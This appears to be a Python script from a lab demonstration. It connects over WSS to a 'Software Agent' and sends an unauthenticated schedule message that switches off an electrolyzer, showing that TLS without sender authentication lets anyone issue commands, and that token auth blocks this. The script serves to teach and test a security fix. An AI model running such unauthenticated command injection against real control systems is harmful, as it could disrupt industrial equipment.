#!/usr/bin/env python3
"""
attacker.py – Malicious WSS client that demonstrates unauthorized command injection.

This script connects to the Software Agent over WSS (verifying the server cert,
proving TLS is working), then sends a schedule message WITHOUT a valid auth token.

In AUTH_MODE=none  → the Agent accepts the message  (vulnerability demonstrated).
In AUTH_MODE=token → the Agent rejects the message  (fix demonstrated).

Usage:
    python3 /opt/p2p-demo/attacker.py --once          # single shot
    python3 /opt/p2p-demo/attacker.py --loop          # repeat every 15 s
    python3 /opt/p2p-demo/attacker.py --loop --interval 5

Environment variables (set via /opt/p2p-demo/attacker.env):
  AGENT_HOST   - hostname/IP of the Software Agent  (default: 10.0.1.20)
  WSS_PORT     - WSS port of the Software Agent     (default: 8443)
  CA_CERT_PATH - path to the trusted server CA cert (default: certs/server.crt)
  LOG_DIR      - directory for attacker.log         (default: /var/log/p2p-demo)
"""

import argparse
import asyncio
import json
import os
import ssl
import sys
import uuid

import websockets

sys.path.insert(0, os.path.dirname(__file__))
from common import setup_logger, build_schedule_message

# ─── Configuration ────────────────────────────────────────────────────────────

AGENT_HOST   = os.environ.get("AGENT_HOST",   "10.0.1.20")
WSS_PORT     = int(os.environ.get("WSS_PORT", "8443"))
CA_CERT_PATH = os.environ.get("CA_CERT_PATH", "/opt/p2p-demo/certs/server.crt")
LOG_DIR      = os.environ.get("LOG_DIR",      "/var/log/p2p-demo")

LOG_FILE = os.path.join(LOG_DIR, "attacker.log")

# ─── Logger ───────────────────────────────────────────────────────────────────

log = setup_logger("attacker", LOG_FILE)

# ─── Attack logic ─────────────────────────────────────────────────────────────

async def send_attack(ssl_ctx: ssl.SSLContext) -> None:
    """Connect to the agent and send a malicious schedule message."""
    uri = f"wss://{AGENT_HOST}:{WSS_PORT}"
    schedule_id = str(uuid.uuid4())

    # Deliberately omit a valid token to demonstrate the vulnerability.
    message = build_schedule_message(
        source="attacker",
        schedule_id=schedule_id,
        electrolyzer_enable=False,   # flip the electrolyzer OFF
        token=None,                  # no token – the attacker doesn't know it
    )

    log.warning("=" * 60)
    log.warning("ATTACK: connecting to %s", uri)
    log.warning("ATTACK: sending malicious schedule_id=%s", schedule_id)
    log.warning("ATTACK: electrolyzer_enable=False (attempting to shut down)")
    log.warning("=" * 60)

    try:
        async with websockets.connect(uri, ssl=ssl_ctx) as ws:
            log.info("TLS handshake succeeded – transport is encrypted (WSS)")
            log.info("Sending malicious message …")
            await ws.send(message)

            response_raw = await asyncio.wait_for(ws.recv(), timeout=10)
            response = json.loads(response_raw)

            if response.get("status") == "accepted":
                log.warning(
                    "ATTACK SUCCEEDED – Agent accepted message without authenticating the sender!"
                )
                log.warning("This demonstrates the vulnerability: WSS encrypts the channel")
                log.warning("but does NOT prevent unauthorized senders from issuing commands.")
            else:
                log.info(
                    "Attack BLOCKED – Agent rejected the message. reason=%s",
                    response.get("reason"),
                )
                log.info("This demonstrates the fix: AUTH_MODE=token is working correctly.")

    except Exception as exc:
        log.error("Connection failed: %s", exc)


async def main(args: argparse.Namespace) -> None:
    uri = f"wss://{AGENT_HOST}:{WSS_PORT}"

    # Build TLS context – verify the server cert.  This proves the channel
    # is encrypted even for the attacker; the missing piece is auth.
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.load_verify_locations(CA_CERT_PATH)
    ssl_ctx.check_hostname = False  # self-signed cert has IP SAN, not hostname

    log.info("Attacker script initialised")
    log.info("  Target : %s", uri)
    log.info("  CA cert: %s", CA_CERT_PATH)

    if args.loop:
        interval = args.interval
        log.info("  Mode   : loop (every %ds)", interval)
        while True:
            await send_attack(ssl_ctx)
            log.info("Waiting %ds before next attack …", interval)
            await asyncio.sleep(interval)
    else:
        log.info("  Mode   : one-shot")
        await send_attack(ssl_ctx)


# ─── CLI ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="WSS attacker – sends unauthorized schedule messages to the agent."
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument(
        "--once",
        dest="loop",
        action="store_false",
        default=False,
        help="Send a single attack message then exit (default).",
    )
    mode.add_argument(
        "--loop",
        dest="loop",
        action="store_true",
        help="Repeatedly send attack messages.",
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=15,
        help="Seconds between attacks in --loop mode (default: 15).",
    )

    parsed = parser.parse_args()
    asyncio.run(main(parsed))
